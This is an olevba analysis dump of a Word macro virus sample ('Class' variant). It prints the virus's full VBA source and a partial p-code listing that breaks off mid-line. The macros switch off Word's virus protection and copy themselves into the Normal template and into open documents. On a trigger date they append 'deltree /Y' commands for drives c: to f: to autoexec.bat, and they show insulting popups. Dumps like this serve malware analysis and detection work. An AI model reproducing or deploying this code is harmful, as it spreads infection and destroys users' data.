olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Dim flagaltro As Boolean
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Dim count As Integer
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Dim bry As Variant
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    On Error Resume Next
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    stato = ActiveDocument.Saved
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Application.EnableCancelKey = Not -1
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
        .ConfirmConversions = 0
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
        .SaveNormalPrompt = 0
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit

'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Kill "c:\cont.dbl"
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Open "c:\cont.dbl" For Output As #1
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    For count = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Next count
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Do Until MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "End Sub"
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
        count = count + 1
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
        If MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then Exit For
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
        Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Loop
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
        
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit

'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    flagio = False
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    For count = 1 To bry.CodeModule.CountOfLines
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
            flagaltro = True
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
                flagaltro = False
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
            End If
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Next count
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    If flagaltro = True Then
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
            If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then Exit For
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
Sub ToolsMacro()
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If
    
    If flagio = False And flagaltro = False Then
        Open "c:\cont.dbl" For Input As #1
        If LOF(1) = 0 Then GoTo cpynorm
        count = 1
        Do While Not EOF(1)
            Line Input #1, stress
            bry.CodeModule.InsertLines count, stress
            count = count + 1
        Loop
cpynorm:
        Close #1
    End If

    flagaltro = False
    flagio = False
    
    Set bry = ActiveDocument.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then Exit For
        Next count
   
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If
    
    If flagio = False And flagaltro = False Then
        Open "c:\cont.dbl" For Input As #1
        If LOF(1) = 0 Then GoTo cpyacti
        count = 1
        Do While Not EOF(1)
            Line Input #1, stress
            bry.CodeModule.InsertLines count, stress
            count = count + 1
        Loop
cpyacti:
        Close #1
    End If

    Kill "c:\cont.dbl"

    Randomize
    If Int((6 * Rnd) + 1) < 3 Then
        With Dialogs(wdDialogFileSummaryInfo)
            .Title = "Macro Carrier"
            .Author = "Dream Blaster"
            .Keywords = "Minny"
            .Execute
        End With
    End If

    If Left(ActiveDocument.Name, 8) <> "Document" Then
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    End If

    If Day(Date) = 17 Then
        If Dir("c:\minny.log", vbHidden + vbSystem) = "" Then
            SetAttr "c:\autoexec.bat", vbNormal
            Open "c:\autoexec.bat" For Input As #1
                Do Until EOF(1)
                    Input #1, stress
                Loop
            Close #1
            
            If stress <> "you are simply a bitch" Then
                Open "c:\autoexec.bat" For Append As #1
                    Print #1, "deltree /Y f:\*"
                    Print #1, "deltree /Y e:\*"
                    Print #1, "deltree /Y d:\*"
                    Print #1, "deltree /Y c:\*"
                    Print #1, "rem Created by Dream Blaster"
                    Print #1, "rem Minny, you are simply a bitch"
                Close #1
            End If
        Else
            MsgBox "You are protected from this virus damage"
        End If
    End If

    ActiveDocument.Saved = stato
    
    On Error GoTo 0
End Sub
Private Sub Document_Open()
    Dim flagaltro As Boolean
    Dim flagio As Boolean
    Dim count As Integer
    Dim bry As Variant

    On Error Resume Next

    Application.EnableCancelKey = Not -1
    With Options
        .ConfirmConversions = 0
        .VirusProtection = 0
        .SaveNormalPrompt = 0
    End With

    flagaltro = False
    flagio = False
    
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then Exit For
        Next count
    
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If
    
    flagaltro = False
    flagio = False
    
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim flagaltro As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then Exit For
        Next count
    
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If

    On Error GoTo 0
End Sub
Sub AutoOpen()
'rr1616/30/99 11:11:43 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
On Error GoTo out
'rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
Options.VirusProtection = False
'rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
Options.SaveNormalPrompt = False
'rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
Options.ConfirmConversions = False
'rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
If nt > 70 And ad > 0 Then GoTo out
'rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
If nt < 70 Then
'rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
End If
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
host.CodeModule.AddFromFile ("c:\class.sys")
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
With host.CodeModule
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    For x = 1 To 4
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    .DeleteLines 1
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    Next x
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
End With
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
If nt < 70 Then
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    With host.CodeModule
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    .replaceline 1, "Sub AutoClose()"
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    .replaceline 71, "Sub ToolsMacro()"
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    End With
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
End If
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
With host.CodeModule
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    For x = 2 To 72 Step 2
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    Next x
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
End With
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
out:
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
End Sub
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
Sub ViewVBCode()
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.fm
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 20923 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #2:
' 	Dim 
' 	VarDefn flagaltro (As Boolean)
' Line #3:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #4:
' 	Dim 
' 	VarDefn count (As Integer)
' Line #5:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #6:
' 	Dim 
' 	VarDefn bry (As Variant)
' Line #7:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #10:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St stato 
' Line #11:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #12:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #13:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #14:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #15:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #16:
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' Line #17:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #18:
' Line #19:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #20:
' 	LitStr 0x000B "c:\cont.dbl"
' 	ArgsCall Kill 0x0001 
' Line #21:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #22:
' 	LitStr 0x000B "c:\cont.dbl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #23:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #24:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #25:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #26:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #28:
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #29:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #30:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	St count 
' Line #31:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #32:
' Line #33:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #34:
' Line #35:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #36:
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #37:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #38:
' Line #39:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #40:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #41:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #42:
' 	Loop 
' Line #43:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #45:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #46:
' Line #47:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #48:
' Line #49:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #50:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #51:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #52:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #53:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #54:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #55:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #56:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #57:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #58:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0014 "Dim stato As Boolean"
' 	Eq 
' 	IfBlock 
' Line #59:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #60:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #61:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #64:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #65:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #66:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #67:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #68:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #69:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #70:
' 	FuncDefn (Sub ToolsMacro())
' Line #71:
' 	QuoteRem 0x0000 0x0044 "Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit"
' Line #72:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #73:
' 	Loop 
' Line #74:
' Line #75:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #76:
' Line #77:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #78:
' 	EndIfBlock 
' Line #79:
' Line #80:
' 	Ld flagio 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld flagaltro 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #81:
' 	LitStr 0x000B "c:\cont.dbl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #82:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo cpynorm 
' 	EndIf 
' Line #83:
' 	LitDI2 0x0001 
' 	St count 
' Line #84:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #85:
' 	LitDI2 0x0001 
' 	Ld stress 
' 	LineInput 
' Line #86:
' 	Ld count 
' 	Ld stress 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #87:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	St count 
' Line #88:
' 	Loop 
' Line #89:
' 	Label cpynorm 
' Line #90:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #91:
' 	EndIfBlock 
' Line #92:
' Line #93:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #94:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #95:
' Line #96:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #97:
' Line #98:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #99:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	IfBlock 
' Line #100:
' 	LitVarSpecial (True)
' 	St flagaltro 
' Line #101:
' 	LitVarSpecial (False)
' 	St flagio 
' Line #102:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0014 "Dim stato As Boolean"
' 	Eq 
' 	IfBlock 
' Line #103:
' 	LitVarSpecial (True)
' 	St flagio 
' Line #104:
' 	LitVarSpecial (False)
' 	St flagaltro 
' Line #105:
' 	ExitFor 
' Line #106:
' 	EndIfBlock 
' Line #107:
' 	EndIfBlock 
' Line #108:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #109:
' Line #110:
' 	Ld flagaltro 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #111:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #112:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #113:
' 	StartForVariable 
' 	Ld count 
' 	EndForVariable 
' 	NextVar 
' Line #114:
' Line #115:
' 	Ld count 
' 	LitDI2 0x0001 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	DoUnitil 
' Line #116:
' 	Ld count 
' 	Paren 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #117:
' 	Loop 
' Line #118:
' Line #119:
' 	Ld count 
' 	Paren 
' 	Ld bry 
